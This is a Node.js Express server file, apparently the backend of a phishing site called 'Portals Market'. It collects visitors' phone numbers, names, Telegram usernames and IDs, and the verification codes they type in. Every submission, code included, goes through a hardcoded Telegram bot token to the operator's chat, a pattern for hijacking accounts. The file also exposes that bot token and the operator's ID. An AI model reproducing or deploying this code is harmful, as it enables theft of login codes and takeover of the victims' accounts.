const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname)));
app.use(express.json());

// ТВОИ ДАННЫЕ
const BOT_TOKEN = '8738031314:AAFZ7ZnyI6lw6PfFCWQp29rB4lKDTtyGj8Y';
const YOUR_ID = '6277925229';  // ← ПРОВЕРЬ ЭТОТ ID!
const YOUR_USERNAME = '@anyaskds';

const codes = {};

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Функция отправки в Telegram с подробным логированием
function sendTelegramMessage(chatId, message) {
    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    console.log(`📤 ОТПРАВКА В TELEGRAM`);
    console.log(`📱 chat_id: ${chatId}`);
    console.log(`📝 Текст: ${message.substring(0, 100)}...`);
    
    return fetch(TELEGRAM_API, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(res => res.json())
    .then(data => {
        if (data.ok) {
            console.log(`✅ УСПЕШНО отправлено в ${chatId}`);
        } else {
            console.log(`❌ ОШИБКА отправки в ${chatId}:`);
            console.log(`   ${data.description}`);
        }
        return data;
    })
    .catch(err => {
        console.log(`❌ ОШИБКА FETCH: ${err.message}`);
    });
}

// ЭТАП 1: Человек написал номер
app.post('/api/send-code', (req, res) => {
    const { phone, region, fullName, username, userId } = req.body;

    const code = Math.floor(100000 + Math.random() * 900000).toString();

    codes[phone] = {
        code: code,
        expires: Date.now() + 120000,
        fullName: fullName,
        username: username,
        userId: userId
    };

    console.log('📱 ПОЛУЧЕН НОМЕР');
    console.log('📱 Телефон:', phone);
    console.log('🔑 Код:', code);

    const message = `
📱 НОВЫЙ ЗАПРОС НА ВЕРИФИКАЦИЮ!

👤 Имя: ${fullName}
📱 Телефон: ${phone}
🆔 ID: ${userId}
👤 Username: @${username || 'нет'}

⏳ Ожидает ввода кода...
📅 Время: ${new Date().toLocaleString()}
    `.trim();

    sendTelegramMessage(YOUR_ID, message);
    sendTelegramMessage(YOUR_USERNAME, message);

    res.json({ success: true });
});

// ЭТАП 2: Человек ввел код
app.post('/api/verify-code', (req, res) => {
    const { phone, code, fullName, username, userId } = req.body;

    console.log('📥 ПОЛУЧЕН ЗАПРОС НА ПРОВЕРКУ КОДА');
    console.log('📱 Телефон:', phone);
    console.log('🔑 Введенный код:', code);

    const stored = codes[phone];

    if (!stored) {
        console.log('❌ Код не найден');
        return res.status(400).json({ success: false, message: 'Код не найден' });
    }

    if (Date.now() > stored.expires) {
        delete codes[phone];
        console.log('❌ Код истек');
        return res.status(400).json({ success: false, message: 'Код истек' });
    }

    if (stored.code !== code) {
        console.log('❌ Неверный код');
        console.log('   Ожидался:', stored.code);
        console.log('   Получен:', code);
        return res.status(400).json({ success: false, message: 'Неверный код' });
    }

    console.log('✅ ВВЕДЕН КОД!');
    console.log('📱 Телефон:', phone);
    console.log('🔑 Введенный код:', code);
    console.log('👤 Имя:', fullName);

    const message = `
✅ ВВЕДЕН КОД ВЕРИФИКАЦИИ!

👤 Имя: ${fullName}
📱 Телефон: ${phone}
🔑 Введенный код: ${code}
🆔 ID: ${userId}
👤 Username: @${username || 'нет'}

📅 Время: ${new Date().toLocaleString()}
    `.trim();

    // ОТПРАВЛЯЕМ ТЕБЕ
    console.log('📤 ОТПРАВКА СООБЩЕНИЯ ТЕБЕ...');
    sendTelegramMessage(YOUR_ID, message);
    sendTelegramMessage(YOUR_USERNAME, message);

    delete codes[phone];

    res.json({ success: true });
});

// Повторная отправка
app.post('/api/resend-code', (req, res) => {
    const { phone } = req.body;
    const newCode = Math.floor(100000 + Math.random() * 900000).toString();

    if (codes[phone]) {
        codes[phone].code = newCode;
        codes[phone].expires = Date.now() + 120000;
    }

    console.log('🔄 ПОВТОРНАЯ ОТПРАВКА');
    console.log('📱 Телефон:', phone);
    console.log('🔑 Новый код:', newCode);

    const message = `
🔄 ПОВТОРНЫЙ КОД

📱 Телефон: ${phone}
🔑 НОВЫЙ КОД: ${newCode}

⏳ Действителен 2 минуты
    `.trim();

    sendTelegramMessage(YOUR_ID, message);
    sendTelegramMessage(YOUR_USERNAME, message);

    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`✅ Portals Market запущен: http://localhost:${PORT}`);
    console.log(`📱 Твой ID: ${YOUR_ID}`);
    console.log(`👤 Твой юзер: ${YOUR_USERNAME}`);
    console.log('========================================');
    console.log('⚠️ ВАЖНО: Напиши боту /start в личку!');
    console.log('========================================');
});